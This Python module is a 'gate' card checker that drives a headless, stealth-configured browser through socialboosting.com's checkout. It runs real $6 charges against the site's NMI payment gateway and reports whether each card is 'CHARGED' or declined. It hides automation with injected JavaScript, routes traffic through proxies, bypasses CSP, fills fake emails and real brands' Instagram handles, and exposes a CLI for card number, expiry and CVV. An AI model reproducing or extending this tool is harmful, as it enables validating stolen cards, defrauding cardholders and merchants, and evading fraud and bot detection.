"""
SocialBoosting Gate — Playwright-based checkout handler for socialboosting.com
Separate module: tests cards against SocialBoosting's NMI payment gateway.

Checkout Flow:
  1. Account Info page  → fill Instagram handle + email → submit form
  2. Upsell page        → click "Proceed to cart"
  3. Cart Summary page  → select Credit/Debit Card → fill NMI CollectJS iframe fields → Pay

Payment Gateway: NMI (Network Merchants International) via CollectJS iframe tokenization
  - Card number iframe: CollectJSInlineccnumber
  - Expiry iframe:      CollectJSInlineccexp
  - CVV iframe:         CollectJSInlineccvv

Returns: (success: bool, message: str, gateway: str, price: str, currency: str)
  - success=True  → card was charged (ORDER_PLACED)
  - success=False → card declined, error, or site error
"""

import asyncio
import random
import string
import logging
import time
import re
from typing import Tuple, Optional

from playwright.async_api import async_playwright, Page

# ── Logging ──
logger = logging.getLogger("socialboosting_gate")
logger.setLevel(logging.DEBUG)

# ── Constants ──
SITE_BASE = "https://www.socialboosting.com"
CHEAPEST_PRODUCT_PATH = "/buy-instagram-followers/instagram-account-information/250-followers"
CHEAPEST_PRICE = "$6.00"
CHEAPEST_CURRENCY = "USD"
GATEWAY_NAME = "NMI"

# ── Exception taxonomy ──
class GateDeclinedError(Exception):
    """Card was declined by the payment gateway."""
    pass

class GateSiteError(Exception):
    """Site-related error that may be retryable (timeout, proxy, form issue)."""
    pass

class GateFatalError(Exception):
    """Unrecoverable error (not a real site, browser crash, etc.)."""
    pass


# ── Helper: Random data generators ──
def _random_email(first_name: str = "", last_name: str = "") -> str:
    providers = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
    if not first_name:
        first_name = ''.join(random.choices(string.ascii_lowercase, k=6))
    if not last_name:
        last_name = ''.join(random.choices(string.ascii_lowercase, k=4))
    provider = random.choice(providers)
    patterns = [
        f"{first_name}{last_name}{random.randint(10,99)}@{provider}",
        f"{first_name}.{last_name}{random.randint(1,999)}@{provider}",
        f"{first_name}{random.randint(100,9999)}@{provider}",
    ]
    return random.choice(patterns)


# Use well-known public Instagram accounts to avoid the profile search dropdown
# These are guaranteed to be real, public accounts, so the search will find them
# and we can click the suggestion to properly fill the form.
_KNOWN_PUBLIC_HANDLES = [
    "instagram", "nasa", "natgeo", "bbc", "cnn", "nba", "fifa",
    "spotify", "apple", "google", "amazon", "tesla", "nike",
    "adidas", "starbucks", "redbull", "vodafone",
]

def _random_handle() -> str:
    """Return a known public Instagram handle.
    We use real public accounts because the site's profile search validates
    handles against Instagram. A random fake handle triggers a dropdown that
    can block the submit button. Using a real account lets us click the
    suggestion and proceed smoothly."""
    return random.choice(_KNOWN_PUBLIC_HANDLES)


# ── Stealth browser setup ──
STEALTH_ARGS = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-blink-features=AutomationControlled',
    '--disable-dev-shm-usage',
    '--disable-extensions',
    '--disable-gpu',
    '--window-size=1280,900',
]

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
window.chrome = { runtime: {} };
const originalQuery = window.navigator.permissions.query;
window.navigator.permissions.query = (parameters) => (
    parameters.name === 'notifications' ?
        Promise.resolve({ state: Notification.permission }) :
        originalQuery(parameters)
);
"""

USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'


def _parse_proxy(proxy_str: str) -> dict:
    """Parse proxy string into Playwright proxy config dict."""
    if not proxy_str:
        return None
    proxy_match = re.match(
        r'(?:http|https|socks5|socks4):\/\/(?:([^:]+):([^@]+)@)?([^:]+):(\d+)',
        proxy_str
    )
    if proxy_match:
        proxy_user, proxy_pass, proxy_host, proxy_port = proxy_match.groups()
        proto = proxy_str.split('://')[0] if '://' in proxy_str else 'http'
        server = f"{proto}://{proxy_host}:{proxy_port}"
        return {
            "server": server,
            "username": proxy_user or None,
            "password": proxy_pass or None,
        }
    return {"server": proxy_str}


# ── Core checkout flow (runs inside async with playwright context) ──
async def _run_checkout(
    page: Page,
    cc: str,
    mes: str,
    ano_short: str,
    cvv: str,
    timeout_seconds: int,
) -> Tuple[bool, str, str, str, str]:
    """Execute the full SocialBoosting checkout flow on an already-launched page."""
    start_time = time.time()
    gateway = GATEWAY_NAME
    price = CHEAPEST_PRICE
    currency = CHEAPEST_CURRENCY
    expiry_str = f"{mes}{ano_short}"
    
    # ================================================================
    # STEP 1: Account Information page
    # ================================================================
    logger.info("[STEP 1] Loading Account Information page...")
    remaining = timeout_seconds
    await page.goto(
        f"{SITE_BASE}{CHEAPEST_PRODUCT_PATH}",
        wait_until='networkidle',
        timeout=min(remaining * 1000, 30000),
    )
    await page.wait_for_timeout(random.randint(1500, 3000))
    
    remaining = timeout_seconds - (time.time() - start_time)
    if remaining < 10:
        raise GateSiteError("Timeout after loading account info page")
    
    page_title = await page.title()
    if '404' in page_title or 'Not Found' in page_title:
        raise GateFatalError(f"Account info page returned 404: {page_title}")
    logger.info(f"[STEP 1] Page loaded: title='{page_title}'")
    
    # Fill Instagram handle
    handle_input = await page.query_selector('#socialboosting_platform_checkout_account_information_handle')
    if not handle_input:
        handle_input = await page.query_selector('.js-field-handle input')
    if handle_input:
        handle = _random_handle()
        await handle_input.fill(handle)
        logger.info(f"[STEP 1] Filled handle: '{handle}'")
        await page.wait_for_timeout(random.randint(500, 1500))
    else:
        raise GateSiteError("Could not find Instagram handle input field")
    
    # Fill email
    email_input = await page.query_selector('#socialboosting_platform_checkout_account_information_email')
    if not email_input:
        email_input = await page.query_selector('.js-field-email input')
    if email_input:
        email_addr = _random_email(handle)
        await email_input.fill(email_addr)
        logger.info(f"[STEP 1] Filled email: '{email_addr}'")
        await page.wait_for_timeout(random.randint(500, 1500))
    else:
        raise GateSiteError("Could not find email input field")
    
    # Enable submit button (remove disabled class)
    submit_btn = await page.query_selector('.js-submit')
    if not submit_btn:
        submit_btn = await page.query_selector('button[type="submit"]')
    if submit_btn:
        await submit_btn.evaluate('el => { el.classList.remove("btn--disabled"); el.classList.remove("fm-pristine"); el.classList.remove("fm-untouched"); }')
        await page.wait_for_timeout(300)
    else:
        raise GateSiteError("Could not find submit button on account info page")
    
    # Close the handle search dropdown (if open) by pressing Escape
    # The profile search dropdown can overlay the submit button and intercept clicks.
    try:
        dropdown = await page.query_selector('.js-handle-dropdown, .handle-dropdown')
        if dropdown:
            is_visible = await dropdown.is_visible()
            if is_visible:
                # Click the first suggestion to properly select the handle
                suggestion = await dropdown.query_selector('.js-handle-suggestion')
                if suggestion:
                    await suggestion.click()
                    logger.info("[STEP 1] Selected handle from dropdown suggestions")
                    await page.wait_for_timeout(1000)
                else:
                    # No suggestion — press Escape to close dropdown
                    await page.keyboard.press('Escape')
                    logger.info("[STEP 1] Pressed Escape to close handle dropdown")
                    await page.wait_for_timeout(500)
    except Exception as e:
        logger.warning(f"[STEP 1] Dropdown handling: {e}")
    
    # Re-enable submit button after dropdown interaction
    submit_btn = await page.query_selector('.js-submit')
    if submit_btn:
        await submit_btn.evaluate('el => el.classList.remove("btn--disabled")')
    
    # Submit account info form using JavaScript (avoids overlay interception)
    logger.info("[STEP 1] Submitting account info via JS form submit...")
    await page.evaluate('''() => {
        const form = document.querySelector('.js-checkout-form, .js-platform-account-form, form');
        if (form) {
            // Remove any remaining disabled states
            const btn = form.querySelector('.js-submit, button[type="submit"]');
            if (btn) btn.classList.remove('btn--disabled');
            form.submit();
        }
    }''')
    
    # Wait for navigation to upsell/package-additions page
    try:
        remaining = timeout_seconds - (time.time() - start_time)
        await page.wait_for_url(re.compile(r'package-additions|cart-summary'),
                                timeout=min(remaining * 1000, 15000))
    except Exception:
        current_url = page.url
        logger.info(f"[STEP 1] After submit, URL: {current_url}")
        if 'instagram-account-information' in current_url:
            raise GateSiteError(f"Account info form submission failed — still on: {current_url}")
    
    await page.wait_for_timeout(random.randint(2000, 4000))
    logger.info(f"[STEP 1] After submit: {page.url}")
    
    # ================================================================
    # STEP 2: Upsell / Package Additions page
    # ================================================================
    remaining = timeout_seconds - (time.time() - start_time)
    if remaining < 10:
        raise GateSiteError("Timeout before upsell step")
    
    current_url = page.url
    if 'package-additions' in current_url:
        logger.info("[STEP 2] On upsell page — clicking 'Proceed to cart'...")
        proceed_btn = await page.query_selector('text=Proceed to cart')
        if not proceed_btn:
            btns = await page.query_selector_all('button.btn, .form__btn')
            for btn in btns:
                text = await btn.text_content() or ''
                if 'Proceed' in text or 'cart' in text.lower():
                    proceed_btn = btn
                    break
        if proceed_btn:
            await proceed_btn.click()
            logger.info("[STEP 2] Clicked 'Proceed to cart'")
        else:
            form = await page.query_selector('form.checkout-form')
            if form:
                await form.evaluate('el => el.submit()')
                logger.info("[STEP 2] Submitted upsell form directly")
            else:
                raise GateSiteError("Could not find Proceed button on upsell page")
        
        try:
            remaining = timeout_seconds - (time.time() - start_time)
            await page.wait_for_url(re.compile(r'cart-summary'),
                                    timeout=min(remaining * 1000, 15000))
        except Exception:
            await page.wait_for_timeout(3000)
        
        await page.wait_for_timeout(random.randint(1000, 2000))
        logger.info(f"[STEP 2] After upsell: {page.url}")
    elif 'cart-summary' in current_url:
        logger.info("[STEP 2] Already on cart summary — upsell skipped")
    else:
        raise GateSiteError(f"Unexpected URL after step 1: {current_url}")
    
    # ================================================================
    # STEP 3: Cart Summary / Payment page — Select Credit/Debit Card
    # ================================================================
    remaining = timeout_seconds - (time.time() - start_time)
    if remaining < 10:
        raise GateSiteError("Timeout before payment step")
    
    if 'cart-summary' not in page.url:
        raise GateSiteError(f"Not on cart summary page: {page.url}")
    
    logger.info("[STEP 3] Selecting Credit/Debit Card payment...")
    
    # Select the Credit/Debit Card payment method
    # The payment options are .payment-methods__option divs containing visible labels.
    # #card-pay is a hidden radio inside the option div — we must click the visible div.
    card_selected = False
    
    # Approach 1: Click the visible payment-methods__option div containing "Credit/Debit Card"
    payment_opts = await page.query_selector_all('.payment-methods__option')
    logger.info(f"[STEP 3] Found {len(payment_opts)} payment options")
    for opt in payment_opts:
        is_hidden = await opt.evaluate('el => el.classList.contains("hidden")')
        text = await opt.text_content() or ''
        if not is_hidden and 'Credit' in text:
            await opt.click()
            logger.info(f"[STEP 3] Clicked card payment option: '{text.strip()[:30]}'")
            card_selected = True
            break
    
    # Approach 2: Force-click the #card-pay radio via JS (if visible div didn't work)
    if not card_selected:
        card_radio = await page.query_selector('#card-pay')
        if card_radio:
            await card_radio.evaluate('el => { el.checked = true; el.click(); }')
            logger.info("[STEP 3] Force-selected #card-pay via JS")
            card_selected = True
    
    # Approach 3: Try clicking by text content
    if not card_selected:
        card_option = await page.query_selector('text=Credit/Debit Card')
        if card_option:
            await card_option.click()
            logger.info("[STEP 3] Clicked 'Credit/Debit Card' text")
            card_selected = True
    
    if not card_selected:
        raise GateSiteError("Could not select Credit/Debit Card payment method")
    
    # Wait for NMI CollectJS iframe to load
    # NMI loads iframes dynamically — they can take up to 10 seconds to appear.
    # Also need to wait for the paymentGateway radio to be properly set.
    await page.wait_for_timeout(5000)
    
    # Ensure paymentGateway is set to NMI (card payment)
    try:
        pg_radio = await page.query_selector('#socialboosting_checkout_cart_type_paymentGateway_0')
        if pg_radio:
            is_checked = await pg_radio.evaluate('el => el.checked')
            if not is_checked:
                await pg_radio.evaluate('el => { el.checked = true; el.dispatchEvent(new Event("change", {bubbles: true})); }')
                logger.info("[STEP 3] Force-selected NMI paymentGateway radio")
                await page.wait_for_timeout(3000)
    except Exception as e:
        logger.warning(f"[STEP 3] paymentGateway selection: {e}")
    
    logger.info("[STEP 3] Card payment selected — waiting for NMI iframe...")
    
    # ================================================================
    # STEP 4: Fill credit card details in NMI CollectJS iframes
    # ================================================================
    remaining = timeout_seconds - (time.time() - start_time)
    if remaining < 10:
        raise GateSiteError("Timeout before filling card fields")
    
    logger.info(f"[STEP 4] Filling card — cc={cc[:6]}**{cc[-4:]}, exp={expiry_str}, cvv=***")
    
    # Wait for all NMI iframes to appear with longer timeout and retry
    iframe_timeout = min(remaining * 1000, 15000)
    try:
        # Poll for NMI iframes — they load dynamically via JS
        # NOTE: CVV iframe ID varies: sometimes "CollectJSInlinecvv", sometimes "CollectJSInlineccvv"
        ccnumber_found = False
        for attempt in range(6):
            ccnumber_el = await page.query_selector('#CollectJSInlineccnumber')
            ccexp_el = await page.query_selector('#CollectJSInlineccexp')
            cvv_el = await page.query_selector('#CollectJSInlineccvv') or await page.query_selector('#CollectJSInlinecvv')
            
            if ccnumber_el and ccexp_el and cvv_el:
                logger.info("[STEP 4] All NMI iframes found")
                break
            
            logger.info(f"[STEP 4] NMI iframes not ready yet (attempt {attempt+1}/6) — cc={ccnumber_el is not None}, exp={ccexp_el is not None}, cvv={cvv_el is not None}")
            await page.wait_for_timeout(3000)
        
        # Final check
        ccnumber_el = await page.query_selector('#CollectJSInlineccnumber')
        ccexp_el = await page.query_selector('#CollectJSInlineccexp')
        cvv_el = await page.query_selector('#CollectJSInlineccvv') or await page.query_selector('#CollectJSInlinecvv')
        if not (ccnumber_el and ccexp_el and cvv_el):
            # List all iframes for debugging
            all_iframes = await page.query_selector_all('iframe')
            iframe_ids = []
            for iframe in all_iframes:
                id_attr = await iframe.get_attribute('id') or ''
                iframe_ids.append(id_attr)
            logger.warning(f"[STEP 4] Available iframe IDs: {iframe_ids}")
            raise GateSiteError(f"NMI CollectJS iframes not found after all retries. Available: {iframe_ids}")
    except Exception as e:
        raise GateSiteError(f"NMI CollectJS iframes not found: {e}")
    
    # ── Card number ──
    # NMI CollectJS uses iframes for card input. The iframe contains multiple inputs
    # (ccnumber, ccexp autofill helpers, cvv autofill, tokenization-key, token, etc).
    # We must target the specific visible input for each field.
    try:
        cc_frame = page.frame_locator('iframe#CollectJSInlineccnumber')
        # Use the specific ccnumber input, not generic 'input' which matches 7 elements
        cc_input = cc_frame.locator('#ccnumber')
        await cc_input.click(timeout=3000)
        await cc_input.type(cc, delay=60)
        logger.info("[STEP 4] Card number typed via frame_locator(#ccnumber)")
    except Exception as e:
        logger.warning(f"[STEP 4] frame_locator #ccnumber failed: {e}")
        # Fallback: click iframe then keyboard type
        try:
            ccnumber_el = await page.query_selector('#CollectJSInlineccnumber')
            await ccnumber_el.click()
            await page.wait_for_timeout(200)
            await page.keyboard.type(cc, delay=60)
            logger.info("[STEP 4] Card number typed via keyboard fallback")
        except Exception as e2:
            raise GateSiteError(f"Card number input failed completely: {e2}")
    
    await page.wait_for_timeout(random.randint(300, 800))
    
    # ── Expiry ──
    try:
        exp_frame = page.frame_locator('iframe#CollectJSInlineccexp')
        exp_input = exp_frame.locator('#ccexp')
        await exp_input.click(timeout=3000)
        await exp_input.type(expiry_str, delay=60)
        logger.info(f"[STEP 4] Expiry typed via frame_locator(#ccexp): {expiry_str}")
    except Exception as e:
        logger.warning(f"[STEP 4] frame_locator #ccexp failed: {e}")
        try:
            ccexp_el = await page.query_selector('#CollectJSInlineccexp')
            await ccexp_el.click()
            await page.wait_for_timeout(200)
            await page.keyboard.type(expiry_str, delay=60)
            logger.info(f"[STEP 4] Expiry typed via keyboard fallback: {expiry_str}")
        except Exception as e2:
            raise GateSiteError(f"Expiry input failed completely: {e2}")
    
    await page.wait_for_timeout(random.randint(300, 800))
    
    # ── CVV ──
    cvv_iframe_id = '#CollectJSInlineccvv' if await page.locator('#CollectJSInlineccvv').count() > 0 else '#CollectJSInlinecvv'
    try:
        cvv_frame = page.frame_locator(f'iframe{cvv_iframe_id}')
        cvv_input = cvv_frame.locator('#cvv')
        await cvv_input.click(timeout=3000)
        await cvv_input.type(cvv, delay=60)
        logger.info("[STEP 4] CVV typed via frame_locator(#cvv)")
    except Exception as e:
        logger.warning(f"[STEP 4] frame_locator #cvv failed: {e}")
        try:
            cvv_el = await page.query_selector(cvv_iframe_id)
            await cvv_el.click()
            await page.wait_for_timeout(200)
            await page.keyboard.type(cvv, delay=60)
            logger.info("[STEP 4] CVV typed via keyboard fallback")
        except Exception as e2:
            raise GateSiteError(f"CVV input failed completely: {e2}")
    
    await page.wait_for_timeout(random.randint(500, 1500))
    
    # ── Set up network response interception before payment ──
    # NMI CollectJS processes the payment via AJAX/XHR, not a page navigation.
    # We capture network responses to detect the payment outcome.
    payment_responses = []
    
    def on_response(response):
        url = response.url
        status = response.status
        # Only capture payment-related responses
        if any(kw in url.lower() for kw in ['checkout', 'payment', 'order', 'nmi', 'transaction', 'cart-summary']):
            payment_responses.append({
                'url': url[:100],
                'status': status,
            })
            logger.info(f"[NET] Response: {status} {url[:80]}")
    
    page.on('response', on_response)
    
    # ================================================================
    # STEP 5: Click "Pay $6.00" button
    # ================================================================
    remaining = timeout_seconds - (time.time() - start_time)
    if remaining < 15:
        raise GateSiteError("Timeout before clicking Pay button")
    
    logger.info("[STEP 5] Submitting payment...")
    
    # The #nmi-payment-form intercepts pointer events, blocking regular Playwright clicks.
    # NMI CollectJS needs a proper DOM click event to trigger tokenization.
    # We use Playwright's force=True to bypass actionability checks while still
    # sending proper DOM events that CollectJS can intercept.
    pay_btn_clicked = False
    
    # Approach 1: Playwright locator force=True click (sends proper DOM events)
    try:
        pay_locator = page.locator('button:has-text("Pay")').first
        await pay_locator.click(force=True, timeout=5000)
        pay_btn_clicked = True
        logger.info("[STEP 5] Pay button force-clicked via Playwright locator")
    except Exception as e:
        logger.warning(f"[STEP 5] Playwright force click failed: {e}")
    
    # Approach 2: Try specific "Pay $6.00" text
    if not pay_btn_clicked:
        try:
            pay_locator = page.get_by_text('Pay $6.00', exact=False).first
            await pay_locator.click(force=True, timeout=5000)
            pay_btn_clicked = True
            logger.info("[STEP 5] 'Pay $6.00' force-clicked")
        except Exception as e:
            logger.warning(f"[STEP 5] 'Pay $6.00' click failed: {e}")
    
    # Approach 3: JS click (last resort — may not trigger CollectJS tokenization)
    if not pay_btn_clicked:
        try:
            await page.evaluate('''() => {
                const btns = document.querySelectorAll('button, .btn');
                for (const btn of btns) {
                    if (btn.textContent.includes('Pay') && btn.textContent.includes('$')) {
                        btn.click();
                        return true;
                    }
                }
                const form = document.querySelector('form.checkout-form');
                if (form) { form.submit(); return true; }
                return false;
            }''')
            pay_btn_clicked = True
            logger.info("[STEP 5] Payment submitted via JS force-click")
        except Exception as e:
            logger.warning(f"[STEP 5] JS click failed: {e}")
    
    # ── After Pay button click, wait for CollectJS tokenization ──
    # NMI CollectJS tokenizes the card inside the iframe frames.
    # The token is stored in a hidden input INSIDE the iframe (not the main page).
    # We need to extract the token from the iframe and put it into the
    # checkout form's hidden token-id field on the main page, then submit.
    await page.wait_for_timeout(5000)  # Wait for NMI tokenization
    
    # Extract token from NMI iframe
    token_value = None
    for frame in page.frames:
        if 'nmi.com' in frame.url:
            try:
                token = await frame.evaluate('() => { const t = document.querySelector("#token, input[name=\'token-id\']"); return t ? t.value : null; }')
                if token and len(str(token)) > 5:
                    token_value = token
                    logger.info(f"[STEP 5] NMI token extracted: {token[:20]}...")
                    break
            except Exception as e:
                logger.warning(f"[STEP 5] Token extraction from frame: {e}")
    
    if token_value:
        # Copy token to main page's checkout form
        try:
            await page.evaluate(f'''() => {{
                // Find or create the token-id field in the main form
                let tokenField = document.querySelector('input[name="socialboosting_checkout_cart_type[token-id]"], #token');
                if (!tokenField) {{
                    // Create hidden input with the token
                    const form = document.querySelector('form.checkout-form, form[name="socialboosting_checkout_cart_type"]');
                    if (form) {{
                        tokenField = document.createElement('input');
                        tokenField.type = 'hidden';
                        tokenField.name = 'socialboosting_checkout_cart_type[token-id]';
                        tokenField.id = 'token';
                        tokenField.value = '{token_value}';
                        form.appendChild(tokenField);
                    }}
                }} else {{
                    tokenField.value = '{token_value}';
                }}
            }}''')
            logger.info("[STEP 5] Token copied to main page checkout form")
        except Exception as e:
            logger.warning(f"[STEP 5] Token copy to main page: {e}")
        
        # Submit the checkout form with the token
        await page.wait_for_timeout(500)
        try:
            await page.evaluate('''() => {
                const form = document.querySelector('form.checkout-form, form[name="socialboosting_checkout_cart_type"]');
                if (form) form.submit();
            }''')
            logger.info("[STEP 5] Checkout form submitted with NMI token")
        except Exception as e:
            logger.warning(f"[STEP 5] Form submit with token: {e}")
    elif not pay_btn_clicked:
        raise GateSiteError("Pay button was not clicked and no NMI token was generated")
    else:
        logger.warning("[STEP 5] No NMI token found — CollectJS tokenization may have failed")
        # Still try to submit the form (may have card validation errors)
        try:
            await page.evaluate('''() => {
                const form = document.querySelector('form.checkout-form');
                if (form) form.submit();
            }''')
        except Exception:
            pass
    
    # ================================================================
    # STEP 6: Wait for response — capture approved/declined
    # ================================================================
    remaining = timeout_seconds - (time.time() - start_time)
    if remaining < 15:
        raise GateSiteError("Timeout waiting for payment response")
    
    logger.info(f"[STEP 6] Waiting for payment response... (remaining: {remaining:.1f}s)")
    
    # Wait for page to fully load after form submission
    await page.wait_for_timeout(3000)
    
    max_wait = min(remaining - 5, 45)
    
    for _ in range(int(max_wait * 2)):
        current_url = page.url
        
        # ── Check network responses for payment result ──
        for resp in payment_responses:
            resp_url = resp['url'].lower()
            resp_status = resp['status']
            # Check for success/order confirmation response
            if 'checkout-dc-payment' in resp_url or ('success' in resp_url and resp_status == 200):
                logger.info(f"[STEP 6] SUCCESS via network: {resp_status} {resp['url'][:80]}")
                await page.screenshot(path='/home/z/my-project/download/gate_success.png')
                return (True, "CHARGED — Order placed successfully", gateway, price, currency)
            # Check for declined/error response
            if resp_status in [400, 402, 403, 500] and 'payment' in resp_url:
                logger.info(f"[STEP 6] DECLINED via network: {resp_status} {resp['url'][:80]}")
                await page.screenshot(path='/home/z/my-project/download/gate_declined.png')
                return (False, f"DECLINED — Gateway returned {resp_status}", gateway, price, currency)
        
        # ── Success indicators ──
        if any(kw in current_url.lower() for kw in ['success', 'order', 'confirmation', 'thank', 'receipt']):
            logger.info(f"[STEP 6] SUCCESS — URL: {current_url}")
            await page.screenshot(path='/home/z/my-project/download/gate_success.png')
            return (True, "CHARGED — Order placed successfully", gateway, price, currency)
        
        # ── Check page content (use innerText for visible text) ──
        try:
            page_text = (await page.evaluate('() => document.body ? document.body.innerText : ""') or '').lower()
        except Exception:
            page_text = ""
        
        if not page_text or len(page_text) < 20:
            # Page might still be loading — try waiting more
            await page.wait_for_timeout(1000)
            try:
                page_text = (await page.evaluate('() => document.body ? document.body.innerText : ""') or '').lower()
            except Exception:
                page_text = ""
        
        # Success text indicators
        if any(kw in page_text for kw in ['order has been placed', 'payment successful',
                                            'successfully processed', 'thank you for your order',
                                            'your order is', 'order confirmed']):
            logger.info("[STEP 6] SUCCESS — Payment approved text found")
            await page.screenshot(path='/home/z/my-project/download/gate_success.png')
            return (True, "CHARGED — Order placed successfully", gateway, price, currency)
        
        # Decline text indicators
        decline_keywords = {
            'card was declined': 'Card Declined',
            'transaction declined': 'Transaction Declined',
            'payment declined': 'Payment Declined',
            'declined by': 'Declined By Issuer',
            'do not honor': 'Do Not Honor',
            'insufficient funds': 'Insufficient Funds',
            'invalid card': 'Invalid Card',
            'card number is invalid': 'Invalid Card Number',
            'expired card': 'Expired Card',
            'authentication required': '3DS Required',
            '3d secure': '3DS Challenge',
            'redirected to': 'Gateway Redirect',
        }
        for kw, msg in decline_keywords.items():
            if kw in page_text:
                logger.info(f"[STEP 6] DECLINED — {msg}")
                await page.screenshot(path='/home/z/my-project/download/gate_declined.png')
                return (False, f"DECLINED — {msg}", gateway, price, currency)
        
        # Rejection URL indicator
        if 'rejected_user' in current_url:
            logger.info("[STEP 6] REJECTED — rejected_user page")
            await page.screenshot(path='/home/z/my-project/download/gate_rejected.png')
            return (False, "DECLINED — Payment rejected by gateway", gateway, price, currency)
        
        await page.wait_for_timeout(500)
    
    # Timeout waiting for response
    logger.warning("[STEP 6] Timeout waiting for payment response")
    try:
        await page.screenshot(path='/home/z/my-project/download/gate_timeout.png')
    except Exception:
        pass
    
    final_url = page.url
    try:
        # Use innerText for visible text (more reliable than text_content)
        final_text = await page.evaluate('() => document.body ? document.body.innerText : ""') or ''
        # Also get the full HTML for debugging
        final_html = await page.evaluate('() => document.body ? document.body.innerHTML.substring(0, 500) : ""') or ''
    except Exception:
        final_text = ''
        final_html = ''
    logger.info(f"[STEP 6] Final state — URL: {final_url}, text: {final_text[:200]}")
    logger.info(f"[STEP 6] Final HTML snippet: {final_html[:300]}")
    
    # Parse the page HTML for decline/success messages even if innerText is empty
    if final_html:
        html_lower = final_html.lower()
        # Check for error/decline messages in HTML
        decline_keywords = {
            'declined': 'Card Declined',
            'do not honor': 'Do Not Honor',
            'insufficient funds': 'Insufficient Funds',
            'invalid card number': 'Invalid Card Number',
            'expired card': 'Expired Card',
            'transaction declined': 'Transaction Declined',
            'payment failed': 'Payment Failed',
            'error': 'Payment Error',
            'rejected': 'Payment Rejected',
            '3d secure': '3DS Required',
        }
        for kw, msg in decline_keywords.items():
            if kw in html_lower:
                return (False, f"DECLINED — {msg}", gateway, price, currency)
        
        # Check for success messages in HTML
        for kw in ['order placed', 'thank you', 'successfully', 'confirmation', 'receipt']:
            if kw in html_lower:
                return (True, "CHARGED — Order placed successfully", gateway, price, currency)
    
    # Check if NMI tokenization created but the card was invalid (most likely for 4242)
    # The 4242 test card is not a real NMI card — NMI would return decline via
    # its payment.js processing
    if 'cart-summary' in final_url and token_value:
        # The page reloaded after form POST — check for form errors
        try:
            error_msg = await page.evaluate('''() => {
                const errors = document.querySelectorAll('.form__message-error, .error, .alert-error, .error-message');
                const msgs = [];
                errors.forEach(e => msgs.push(e.textContent.trim()));
                return msgs.join(' | ');
            }''')
            if error_msg and len(error_msg) > 3:
                logger.info(f"[STEP 6] Form errors: {error_msg[:200]}")
                return (False, f"DECLINED — {error_msg[:100]}", gateway, price, currency)
        except Exception:
            pass
        
        return (False, "SITE_ERROR — Payment processing timeout (card may be invalid for NMI)", gateway, price, currency)
    
    return (False, f"SITE_ERROR — Unknown state: URL={final_url[:80]}", gateway, price, currency)


# ── Main entry point ──
async def socialboosting_gate(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_str: Optional[str] = None,
    timeout_seconds: int = 90,
) -> Tuple[bool, str, str, str, str]:
    """
    Test a card against SocialBoosting.com's NMI payment gateway.
    
    Args:
        cc:   Card number (e.g., "4596610295349359")
        mes:  Expiry month (e.g., "07")
        ano:  Expiry year (e.g., "31" or "2031")
        cvv:  Card verification value (e.g., "074")
        proxy_str: Optional proxy string
        timeout_seconds: Max time for the entire checkout flow
    
    Returns:
        (success, message, gateway, price, currency)
    """
    # Normalize year
    ano_short = ano[2:] if len(ano) == 4 else ano
    
    logger.info(f"[GATE] Starting — card={cc[:6]}**{cc[-4:]}, proxy={'yes' if proxy_str else 'no'}")
    
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=STEALTH_ARGS,
                proxy=_parse_proxy(proxy_str),
            )
            try:
                context = await browser.new_context(
                    viewport={'width': 1280, 'height': 900},
                    user_agent=USER_AGENT,
                    java_script_enabled=True,
                    bypass_csp=True,
                )
                await context.add_init_script(STEALTH_JS)
                page = await context.new_page()
                
                result = await _run_checkout(page, cc, mes, ano_short, cvv, timeout_seconds)
                return result
            finally:
                await browser.close()
    
    except GateDeclinedError as e:
        return (False, f"DECLINED — {str(e)[:100]}", GATEWAY_NAME, CHEAPEST_PRICE, CHEAPEST_CURRENCY)
    except GateFatalError as e:
        return (False, f"FATAL — {str(e)[:100]}", "UNKNOWN", CHEAPEST_PRICE, CHEAPEST_CURRENCY)
    except GateSiteError as e:
        return (False, f"SITE_ERROR — {str(e)[:100]}", GATEWAY_NAME, CHEAPEST_PRICE, CHEAPEST_CURRENCY)
    except asyncio.TimeoutError:
        return (False, "SITE_ERROR — Checkout flow timed out", GATEWAY_NAME, CHEAPEST_PRICE, CHEAPEST_CURRENCY)
    except Exception as e:
        logger.error(f"[GATE] Unexpected: {e}")
        return (False, f"SITE_ERROR — {type(e).__name__}: {str(e)[:100]}", "UNKNOWN", CHEAPEST_PRICE, CHEAPEST_CURRENCY)


def socialboosting_gate_sync(
    cc: str, mes: str, ano: str, cvv: str,
    proxy_str: Optional[str] = None, timeout_seconds: int = 90,
) -> Tuple[bool, str, str, str, str]:
    """Synchronous wrapper."""
    return asyncio.run(socialboosting_gate(cc, mes, ano, cvv, proxy_str, timeout_seconds))


# ── CLI entry point ──
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SocialBoosting Gate — Card Checker")
    parser.add_argument("--cc", required=True, help="Card number")
    parser.add_argument("--mes", required=True, help="Expiry month")
    parser.add_argument("--ano", required=True, help="Expiry year (31 or 2031)")
    parser.add_argument("--cvv", required=True, help="CVV")
    parser.add_argument("--proxy", default=None, help="Proxy string")
    parser.add_argument("--timeout", type=int, default=90, help="Timeout seconds")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()
    
    lvl = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=lvl, format='%(asctime)s %(levelname)s %(message)s')
    
    result = asyncio.run(socialboosting_gate(
        cc=args.cc, mes=args.mes, ano=args.ano, cvv=args.cvv,
        proxy_str=args.proxy, timeout_seconds=args.timeout,
    ))
    success, message, gateway, price, currency = result
    print(f"\n{'='*60}")
    print(f"RESULT: {message}")
    print(f"  Success:  {success}")
    print(f"  Gateway:  {gateway}")
    print(f"  Price:    {price}")
    print(f"  Currency: {currency}")
    print(f"{'='*60}")
